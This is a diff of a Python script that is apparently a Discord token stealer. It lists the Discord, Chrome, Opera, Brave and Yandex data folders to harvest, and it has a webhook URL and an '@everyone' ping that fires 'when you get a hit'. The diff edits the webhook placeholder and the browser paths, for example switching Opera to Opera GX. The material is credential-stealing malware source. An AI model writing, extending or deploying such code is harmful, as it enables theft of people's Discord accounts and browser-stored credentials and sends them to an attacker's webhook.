@@ -7,7 +7,7 @@ import json
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = 'your webhook'
+WEBHOOK_URL = ''
 
 # mentions you when you get a hit
 PING_ME = True
@@ -32,13 +32,13 @@ def main():
     roaming = os.getenv('APPDATA')
 
     paths = {
-        'Discord': roaming + '\\Discord',
+        'Discord': roaming + '\\discord',
         'Discord Canary': roaming + '\\discordcanary',
         'Discord PTB': roaming + '\\discordptb',
         'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Opera': roaming + '\\Opera Software\\Opera GX Stable',
         'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
     }
 
     message = '@everyone' if PING_ME else ''
